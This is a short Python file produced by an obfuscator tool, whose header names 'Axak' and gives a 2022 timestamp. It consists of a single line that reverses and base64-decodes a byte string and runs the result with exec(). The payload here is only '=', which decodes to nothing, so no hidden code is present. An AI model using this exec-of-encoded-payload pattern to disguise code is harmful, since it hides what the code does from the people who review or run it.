# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Mon Jun  6 19:46:10 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))